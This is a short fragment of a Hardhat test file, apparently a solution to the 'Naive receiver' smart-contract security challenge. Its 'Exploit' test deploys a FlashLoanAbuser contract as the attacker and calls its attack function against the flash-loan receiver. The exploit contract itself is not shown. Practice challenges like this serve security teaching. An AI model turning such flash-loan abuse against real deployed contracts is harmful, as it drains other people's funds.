...
describe("[Challenge] Naive receiver", function () {
    ...
    it("Exploit", async function () {
        ...
        const FlashLoanAbuser = await ethers.getContractFactory("FlashLoanAbuser", attacker);
        this.abuser = await FlashLoanAbuser.deploy(this.pool.address);
        await this.abuser.attack(this.receiver.address);
    });
